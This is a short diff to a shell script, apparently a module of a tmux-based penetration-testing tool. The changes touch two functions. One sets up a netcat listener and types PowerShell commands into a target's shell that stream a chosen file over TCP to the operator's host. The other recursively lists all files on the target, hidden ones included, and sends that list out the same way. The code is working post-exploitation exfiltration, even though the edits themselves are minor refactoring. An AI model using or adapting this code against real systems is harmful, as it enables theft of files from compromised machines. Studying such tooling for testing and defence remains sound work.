@@ -26,7 +26,7 @@ _fetch_file() {
 
   nc_window="$(tmux new-window -P -d "nc -nlvp \"$lport\" > \"$dst\"")"
 
-  tmux send-keys -t "$pane_id" "\$FileName = '$src'" Enter
+  tmux send-keys -t "$pane_id" "\$FileName = $src" Enter
   tmux send-keys -t "$pane_id" '[byte[]]$buffer = New-Object byte[] 1024' Enter
   tmux send-keys -t "$pane_id" '$FileStream = [System.IO.File]::OpenRead($FileName)' Enter
   tmux send-keys -t "$pane_id" "\$TcpClient = New-Object System.Net.Sockets.TcpClient(\"$lhost\", \"$lport\")" Enter
@@ -48,9 +48,8 @@ _list_files() {
   local lport="$(penmux_module_get_option "$_MODULE_PATH" "LocalTempPort" "$pane_id")"
   local files="$(mktemp)"
 
-  tmux send-keys -t "$pane_id" '$FileName = $TEMP\fl.txt' Enter
-  tmux send-keys -t "$pane_id" 'Get-ChildItem -File -recurse | Select Name -ExpandProperty FullName > $FileName' Enter
-  tmux send-keys -t "$pane_id" 'Get-ChildItem -Hidden -File -recurse | Select Name -ExpandProperty FullName >> $FileName' Enter
+  tmux send-keys -t "$pane_id" 'Get-ChildItem -File -recurse | Select Name -ExpandProperty FullName > $TEMP\fl.txt' Enter
+  tmux send-keys -t "$pane_id" 'Get-ChildItem -Hidden -File -recurse | Select Name -ExpandProperty FullName >> $TEMP\fl.txt' Enter
 
   _fetch_file "$pane_id" '$TEMP\fl.txt' "$files" "$lhost" "$lport"
 
